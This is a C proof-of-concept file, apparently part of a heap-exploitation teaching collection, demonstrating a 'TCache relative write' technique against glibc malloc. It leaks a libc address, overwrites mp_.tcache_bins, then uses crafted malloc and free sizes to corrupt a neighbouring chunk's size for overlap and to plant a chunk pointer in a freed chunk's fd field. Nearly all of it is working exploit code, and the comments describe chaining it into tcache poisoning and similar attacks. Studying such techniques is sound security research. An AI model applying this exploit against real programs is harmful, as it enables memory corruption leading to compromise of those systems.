#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <malloc.h>

int main(void)
{
    /*
     * This document demonstrates TCache relative write technique
     * Reference: https://d4r30.github.io/heap-exploit/2025/11/25/tcache-relative-write.html
     *
     * Objectives: 
     *   - To write a semi-arbitrary (or possibly fully arbitrary) value into an arbitrary location on heap
     *   - To write the pointer of an attacker-controlled chunk into an arbitrary location on heap.
     * 
     * Cause: UAF/Overflow
     * Applicable versions: GLIBC >=2.30
     *
     * Prerequisites:
     * 	 - The ability to write a large value (>64) on an arbitrary location
     * 	 - Libc leak
     * 	 - Ability to malloc/free with sizes higher than TCache maximum chunk size (0x408)
     *
     * Summary: 
     * The core concept of "TCache relative writing" is around the fact that when the allocator is recording 
     * a tcache chunk in `tcache_perthread_struct` (tcache metadata), it does not enforce enough check and 
     * restraint on the computed tcachebin indice (`tc_idx`), thus WHERE the tcachebin count and head 
     * pointer will be written are not restricted by the allocator by any means. The allocator treats extended 
     * bin indices as valid in both `tcache_put` and `tcache_get` scenarios. If we're somehow able to write a 
     * huge value on one of the fields of mp_ (tcache_bins from malloc_par), by requesting 
     * a chunk size higher than TCache range, we can control the place that a **tcachebin pointer** and 
     * **counter** is going to be written. Considering the fact that a `tcache_perthread_struct` is normally 
     * placed on heap, one can perform a *TCache relative write* on an arbitrary point located after the tcache 
     * metadata chunk (Even on `tcache->entries` list to poison tcache metadata). By writing the new freed tcache 
     * chunk's pointer, we can combine this technique with other techniques like tcache poisoning or fastbin corruption 
     * and to trigger a heap leak. By writing the new counter, we can poison `tcache->entries`, write semi-arbitrary decimals
     * into an arbitrary location of heap, with the right amount of mallocs and frees. With all these combined, one is 
     * able to create impactful chains of exploits, using this technique as their foundation.
     *
     * PoC written by D4R30 (Mahdyar Bahrami)
     *
    */

    setbuf(stdout, NULL);
    
    printf("This file demonstrates TCache relative write, a technique used to achieve arbitrary decimal writing and chunk pointer arbitrary write on heap.\n");
    printf("The technique takes advantage of the fact that the allocator does not enforce appropriate restraints on the computed tcache indices (tc_idx)\n");
    printf("As a prerequisite, we should be capable of writing a large value (anything larger than 64) on an arbitrary location, which in our case is mp_.tcache_bins\n\n");    

    unsigned long *p1 = malloc(0x410);	// The chunk that we can overflow or have a UAF on
    unsigned long *p2 = malloc(0x100);	// The target chunk used to demonstrate chunk overlap
    size_t p2_orig_size = p2[-1];
    
    free(p1);	// In this PoC, we use p1 simply for a libc leak

    /* VULNERABILITY */

    printf("First of all, you need to write a large value on mp_.tcache_bins, to bypass the tcache indice check.\n");
    printf("This can be done by techniques that have unsortedbin attack's similar impact, like largebin attack, fastbin_reverse_into_tcache and house_of_mind_fastbins\n");
    
    // --- Step 1: Write a huge value into mp_.tcache_bins ---
    // You should have the ability to write a huge value on an arbitrary location; this doesn't necessarily
    // mean a full arbitrary write. Writing any value larger than 64 would suffice.
    // This could be done in a program-specific way, or by a UAF/Overflow in target program. By a UAF/Overflow,
    // you can use techniques like largebin attack, fastbin_reverse_into_tcache and house of mind (fastbins).

    unsigned long *mp_tcache_bins = (void*)p1[0] - 0x918;   // Relative computation of &mp_.tcache_bins
    printf("&mp_.tcache_bins: %p\n", mp_tcache_bins);

    *mp_tcache_bins = 0x7fffffffffff;	// Write a large value into mp_.tcache_bins
    printf("mp_.tcache_bins is now set to a large value. This enables us to pass the only check on tc_idx\n\n");

    // Note: If we're also capable of making mp_.tcache_count a large value along with mp_.tcache_bins, we can
    // trigger a fully arbitrary decimal writing. In the normal case, with just mp_tcache_bins set to a large value,
    // what we can write into target is limited to a range of [0,7].  
    printf("If you're also capable of setting mp_.tcache_count to a large value, you can possibly achieve a *fully* arbitrary write.\n");

    /* END VULNERABILITY */

    /*
     * The idea is to craft a precise `tc_idx` such that, when it is used by `tcache_put`, the resulting write of 
     * tcachebin pointer and its counter occurs beyond the bounds of `tcache_perthread_struct` (which is on heap) 
     * and into our target location. This is done by requesting a chunk with the right amount of size and then 
     * freeing it. To compute the right size, we have to consider `csize2tidx` and the pointer arithmetic within 
     * `tcache_put` when it comes to indexing. The only check that can stop us from out-of-bounds writing is the 
     * `tc_idx < mp_.tcache_bins` check, which can get bypassed by writing a large value on `mp_.tcache_bins` (Which 
     * we already did in step 1)   
    */

    // --- Step 2: Compute the correct chunk size to malloc and then free --- 
    /*
     * The next step is to acquire the exact chunk size (nb) we should malloc and free to trick tcache_put into 
     * writing the counter or pointer variable on the desired location.
     * To precisely calculate the size, we first have to understand how a tc_idx (tcache index) is calculated. A tc_idx
     * is computed by the csize2tidx macro. Here's its defenition:
    
      # define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
    
     * If we let `nb` be the internal form of the freeing chunk size, `MALLOC_ALIGNMENT=0x10`, and `MINSIZE=0x20` then:
     * tc_index = (nb - 0x20 + 0x10 -1) / 0x10 = (nb - 0x11) / 0x10
     * Because tc_index is an integer: tc_index = (nb-16)/16 - 1
     * So if `nb = 0x20` (least chunk size), then `tc_index = 0`, if `nb = 0x30`, then `tc_index = 1`, and so on.
     * With some knowledge of C pointer arithmetic, we can predict the location of the tcachebin pointer & counter 
     * write, just by having `nb` on our hands:
     
     * unsigned long *ptr_write_loc = (void*)(&tcache->entries) + 8*tc_index = (void*)(&tcache->entries) + (nb-16)/2 - 8
     * unsigned long *counter_write_loc = (void*)(&tcache->counts) + 2*tc_index = (void*)(&tcache->counts) + (nb-16)/8 - 2
    
     * Note: Here `tcache` is just symbol for a pointer to the heap-allocated `tcache_perthread_struct`
     * In other words: 
     
       * Location we want to overwrite with tcache pointer = tcache_entries location + (nb-16)/2 - 8
       * Location we want to overwrite with the counter = tcache_counts location + (nb-16)/8 - 2
     
     * Note: To compute nb, you don't need to have absolute addresses for tcache_perthread_struct and the chosen location;
     * only the difference between these two locations is required.
     * So: 
         - For a chunk pointer arbitrary write: nb = 2*(delta+8)+16
	 - For a counter arbitrary write: nb = 8*(delta+2)+16 
     
     * For example, if the tcache structure is allocated at `0x555555559000`, and you want to overwrite a half-word 
     * (`++counts[tc_index]`) at `0x5555555596b8`: 
     * delta = 0x5555555596b8 - (&tcache->counts) = 0x5555555596b8 - 0x555555559010 = 0x6a8
     * Even if ASLR is on, the delta would always be `0x6a8`. So no heap-leak is required.
    */

    // --- Step 3: Combine with other techniques to create impactful attack chains ---
    // In this PoC, we trigger a chunk overlapping and pointer arbitrary write to introduce the two main primitives.
    //
    // Note: Overlapping chunk attack & pointer arbitrary write are just two possible use cases here. You can come up with wide 
    // range of other possible attack chains, using tcache relative write as their foundation. It is obvious that you can 
    // write arbitrary decimal values, by requesting and freeing the same chunk multiple times; overlapping chunk attack is
    // just one simple way to use that. 

    // ---------------------------------
    // | Ex: Trigger chunk overlapping |
    // ---------------------------------
    // To see the counter arbitrary write in practice, let's assume that we want to write counter on p2->size and make chunk p2 
    // a very large chunk, so that it overlaps the next chunks.   
    // First of all, we need to compute delta, then put it into the formula we discussed to get nb.
    printf("--- Chunk overlapping attack ---\n");
    printf("Now, our goal is to make a large overlapping chunk. We already allocated two chunks: p1(%p) and p2(%p)\n", p1, p2);
    printf("The goal is to corrupt p2->size to make it an overlapping chunk. The original usable size of p2 is: 0x%lx\n", p2_orig_size);
    printf("To trigger tcache relative write in a way that p2->size is corrupted, we need to compute the exact chunk size(nb) to malloc and free\n");
    printf("We use this formula: nb = 8*(delta+2)+16\n");

    void *tcache_counts = (void*)p1 - 0x290; 	// Get tcache->counts	
    unsigned long delta = ((void*)p2 - 6) - tcache_counts;

    // Based on the formula above: nb = 8*(delta+2)+16
    unsigned long nb = 8*(delta+2)+16;

    // That's it! Now we exactly know what chunk size we should request to trigger counter write on our target
    unsigned long *p = malloc(nb-0x10);	
    
    // Trigger TCache relative write
    free(p);
    
    // Now lets see if p2's size is changed
    assert(p2[-1] > p2_orig_size);
    printf("p2->size after tcache relative write is: 0x%lx\n\n", p2[-1]);

    // Now we can free p2 and later recover it with a larger request
    free(p2);
    p = malloc(0x10100); 

    // Lets see if the new returned pointer equals p2 
    assert(p == p2);

    // -------------------------------------
    // | Ex: Chunk pointer arbitrary write |
    // -------------------------------------
    // Now to further demonstrate the power of tcache-relative write, lets relative write a freeing chunk
    // pointer into an arbitrary location. This can be used for tcache poisoning, fastbin corruption,  
    // House of Lore, etc.
    printf("--- Chunk pointer arbitrary write ---\n");
    printf("To demonstrate the chunk pointer arbitrary write capability, our goal is to write a freeing chunk pointer at p2->fd\n");
    printf("We use the formula nb = 2*(delta+8)+16");

    // Compute delta (The difference between &p1->fd and &tcache->entries)
    void *tcache_entries = (void*)p1 - 0x210;  // Compute &tcache->entries
    delta = (void*)p1 - tcache_entries;

    // Based on the formulas we discussed above: nb = 2*(delta+8)+16
    nb = 2*(delta+8)+16; 

    printf("We should request and free a chunk of size 0x%lx\n", nb-0x10);
    p = malloc(nb-0x10); 

    // Trigger tcache relative write (Write freeing pointer into p1->fd)
    printf("Freeing p (%p) to trigger relative write.\n", p);
    free(p);

    assert(p1[0] == (unsigned long)p);
    printf("p1->fd is now set to p, the chunk that we just freed.\n");

    // tcache poisoning, fastbin corruption (<2.32 only with tcache relative write), house of lore, etc....
}

